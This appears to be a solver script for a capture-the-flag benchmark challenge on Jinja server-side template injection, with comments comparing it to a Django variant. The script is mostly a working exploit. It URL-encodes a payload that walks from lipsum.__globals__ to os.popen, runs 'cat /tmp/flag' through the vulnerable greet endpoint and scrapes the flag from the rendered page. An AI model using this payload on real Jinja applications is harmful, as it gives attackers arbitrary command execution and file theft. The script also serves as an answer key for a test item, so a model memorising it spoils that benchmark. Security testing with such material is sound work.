#!/usr/bin/env bash
# XBEN-076-24 — "SSTI Jinja" (tags: ssti)
#
# `/greet?name=` is rendered as a Jinja template, so the parameter is code.
# `lipsum.__globals__.os` is the shortest route from a template to a shell.
#
# Compare XBEN-009, which is the same shape in Django: there the flag was
# already in the template context and `{{FLAG}}` printed it, so no escape was
# needed at all. Here the flag is a file, so the payload has to reach `os`.
# Same class, different distance to the answer.
set -uo pipefail
URL="${1:?usage: $0 http://127.0.0.1:PORT}"
H5I="${H5I:-h5i}"
SESSION="xben076-$$"
trap '"$H5I" browser close --session "$SESSION" >/dev/null 2>&1' EXIT

PAYLOAD="$(python3 -c "
import urllib.parse
print(urllib.parse.quote('{{lipsum.__globals__.os.popen(%r).read()}}' % 'cat /tmp/flag'))")"

"$H5I" browser open "$URL/greet?name=$PAYLOAD" --session "$SESSION" --new --capture >/dev/null
"$H5I" browser markdown --session "$SESSION" |
    python3 -c 'import re,sys; m=re.search(r"FLAG\{[a-f0-9]{64}\}", sys.stdin.read()); print(m.group(0) if m else "no flag found")'
